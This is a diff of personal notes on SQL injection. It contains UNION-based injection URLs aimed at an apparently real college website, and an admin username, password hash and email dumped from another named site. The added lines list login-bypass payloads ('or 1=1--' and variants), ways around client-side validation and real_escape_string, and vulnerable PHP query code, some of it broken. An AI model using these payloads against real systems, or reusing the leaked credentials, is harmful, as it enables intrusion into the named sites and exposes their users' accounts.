@@ -54,6 +54,13 @@ https://hcst.edu.in/fullprofile.php?id=75%27UNION+SELECT+1,2,3,(SELECT+GROUP_CON
 
 To find columns name - (SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x6370745f61646d696e+AND+TABLE_SCHEMA=DATABASE())
 
+
+
+https://hcst.edu.in/fullprofile.php?id=75%27UNION+SELECT+1,2,3,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x4c4f47494e+AND+TABLE_SCHEMA=DATABASE()),5,@@GLOBAL.VERSION,7,8,9,10,11,12,13,14,15,16--%20-
+
+
+
+
 (SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x4c4f47494e20+AND+TABLE_SCHEMA=DATABASE())
 
 column name - [username,password,email_id]
@@ -66,3 +73,41 @@ To dump data from other database - (SELECT+GROUP_CONCAT(username,password,email_
 username - super@Cptcadmin
 password - cddbc321b8dfbd0a4145695631925d69
 email - superadmin@cptc.ac.in
+
+
+
+sql injection can be performed on a login page as well 
+
+ex :- SELECT * from users where username = 'admin' and password = 'admin123' Code will be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or 1=1--'
+ or it can be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or '1'='1'--'
+ or it can be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or '1'='1'#
+ or it can be like this --> SELECT * from users where username = 'admin' and password = 'admin123' or '1'='1'/*
+ or it can be like this --> SELECT * from users where username = 'admin' # ' and password = 'admin123' or 1=1 --'
+ or it can be like this --> SELECT * from users where username = 'admin' order by 1--'
+
+
+
+
+
+ if client side validation is on then we can bypass it by using burp suite or by using inspect element and changing the type of input 
+ from password to text and then we can see the password in plain text
+
+
+diffrent levels of sql injection
+<?php
+    $query = "SELECT * FROM users WHERE username = '" . 
+    ['username'] . 
+    "' AND password = '" . 
+    ['password'] . "'";
+
+
+    $query = "SELECT * FROM users WHERE username = '" . 
+    $conn->real_escape_string($_POST['username']) .
+    "' AND password = '" .
+    $conn->real_escape_string($_POST['password']) . "'";
+
+?>
+
+ways to byass real_escape_string function
+      1. hex encoding
+      2. double encoding
